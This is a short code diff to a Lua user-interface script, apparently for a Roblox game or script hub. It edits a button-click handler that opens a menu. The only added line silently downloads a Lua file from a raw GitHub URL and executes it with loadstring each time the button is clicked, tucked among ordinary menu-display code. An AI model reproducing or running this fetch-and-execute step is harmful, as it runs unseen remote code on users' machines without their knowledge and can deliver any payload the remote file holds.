@@ -1639,6 +1639,7 @@ local script = UI["15"]
 	
 	local function onButtonClick()
 		menu.Visible = true
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemHubC/SystemHub/refs/heads/main/Idk.lua"))()
 		script.Parent.Parent.Home.Actions.Version.TextLabels.text = Status
 		textLabel.Text = textPath
 		wait(1)
